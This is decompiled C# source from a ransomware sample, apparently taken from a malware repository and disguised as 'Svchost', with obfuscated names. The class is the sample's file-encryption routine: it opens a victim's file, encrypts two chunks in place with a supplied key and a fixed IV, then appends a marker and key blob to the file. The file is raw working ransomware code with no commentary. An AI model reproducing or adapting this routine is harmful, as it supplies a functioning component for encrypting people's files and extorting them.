// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.moeoEUcfSQywx
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using qKKKydaPmBIOW;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace qYAjLWajCJpnf
{
  internal sealed class moeoEUcfSQywx
  {
    [NonSerialized]
    internal static GetString \u008C;

    public static int pDSQmvdZbEUD([In] long obj0) => (int) obj0;

    public static bool MtYwfepEBjPifI(
      string WdtqmErgZJDNR,
      string LHrGpnQKzTdZOx,
      string eJSkrcdqHzLHAMc,
      byte[] kQikxFjlGMQ = null)
    {
      try
      {
        using (FileStream fileStream = new FileStream(WdtqmErgZJDNR, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
          int num1 = moeoEUcfSQywx.pDSQmvdZbEUD(fileStream.Length) / 3;
          if (num1 < 0)
            num1 *= -1;
          int num2;
          try
          {
            num2 = Convert.ToInt32(LHrGpnQKzTdZOx) * Convert.ToInt32(fileStream.Length) / 100;
            if (num2 < 0)
              num2 *= -1;
          }
          catch
          {
            num2 = int.MaxValue;
          }
          if (num1 < num2)
            num2 = num1 - Convert.ToInt32(LHrGpnQKzTdZOx) * 1000 * 1000;
          int num3 = 32;
          int xxEvOvSPzlp = (int) Math.Round((double) num2 / (double) num3, MidpointRounding.AwayFromZero) * num3;
          for (int index = 0; index < 2; ++index)
          {
            byte[] numArray = moeoEUcfSQywx.NnIWmCPpEMc(WdtqmErgZJDNR, fileStream, xxEvOvSPzlp, num1 * index);
            byte[] ffyLHPohnoXGo;
            if (!bTJSgdVkQM.iRryUAENoXyxNt)
              ffyLHPohnoXGo = YyTkJTBkSaQ.grhgCFxqniVe(numArray, Encoding.ASCII.GetBytes(eJSkrcdqHzLHAMc), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            else
              ffyLHPohnoXGo = ivMVFneIiiSs.QBYVYTkGHVQKD(numArray, Encoding.ASCII.GetBytes(eJSkrcdqHzLHAMc), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            moeoEUcfSQywx.sVJcXNjsdvOrotQ(WdtqmErgZJDNR, fileStream, ffyLHPohnoXGo, num1 * index);
          }
        }
        byte[] buffer = bTJSgdVkQM.CVCyEBDPJVibYms ? Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(moeoEUcfSQywx.\u008C(107456102)) + bTJSgdVkQM.gvCYkntYkqMW(moeoEUcfSQywx.\u008C(107457086)) + Convert.ToString(LHrGpnQKzTdZOx) + bTJSgdVkQM.gvCYkntYkqMW(moeoEUcfSQywx.\u008C(107457086))) : Encoding.ASCII.GetBytes(bTJSgdVkQM.gvCYkntYkqMW(moeoEUcfSQywx.\u008C(107456102)) + bTJSgdVkQM.gvCYkntYkqMW(moeoEUcfSQywx.\u008C(107457095)) + Convert.ToString(LHrGpnQKzTdZOx) + bTJSgdVkQM.gvCYkntYkqMW(moeoEUcfSQywx.\u008C(107457095)));
        if (!bTJSgdVkQM.CVCyEBDPJVibYms)
        {
          using (FileStream fileStream = new FileStream(WdtqmErgZJDNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
            fileStream.Write(buffer, 0, buffer.Length);
        }
        else
        {
          using (FileStream fileStream = new FileStream(WdtqmErgZJDNR, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            fileStream.Write(kQikxFjlGMQ, 0, kQikxFjlGMQ.Length);
            fileStream.Write(buffer, 0, buffer.Length);
          }
        }
      }
      catch (Exception ex1)
      {
        if (bTJSgdVkQM.JJYUPCZGaGN)
        {
          try
          {
            File.AppendAllText(bTJSgdVkQM.vzSBJQFXpb, moeoEUcfSQywx.\u008C(107378861) + WdtqmErgZJDNR + moeoEUcfSQywx.\u008C(107456121) + ex1.Message + moeoEUcfSQywx.\u008C(107397229));
          }
          catch (Exception ex2)
          {
          }
        }
        ++bTJSgdVkQM.AmOSyvkYqZhk;
        return false;
      }
      ++bTJSgdVkQM.ytQePvltMhp;
      return true;
    }

    public static byte[] NnIWmCPpEMc(
      string ploQMsEGpQb,
      FileStream VdwGloEaMaQmVYpG,
      int xxEvOvSPzlp,
      int mtkauaLbnAY = 0)
    {
      byte[] buffer = new byte[xxEvOvSPzlp];
      VdwGloEaMaQmVYpG.Position = (long) mtkauaLbnAY;
      VdwGloEaMaQmVYpG.Read(buffer, 0, xxEvOvSPzlp);
      return buffer;
    }

    public static void sVJcXNjsdvOrotQ(
      string LkSiemHCNOz,
      FileStream YmOjAanYAtY,
      byte[] ffyLHPohnoXGo,
      int BhimouCxbdgTIz = 0)
    {
      YmOjAanYAtY.Position = (long) BhimouCxbdgTIz;
      YmOjAanYAtY.Write(ffyLHPohnoXGo, 0, ffyLHPohnoXGo.Length);
    }

    static moeoEUcfSQywx() => Strings.CreateGetStringDelegate(typeof (moeoEUcfSQywx));
  }
}
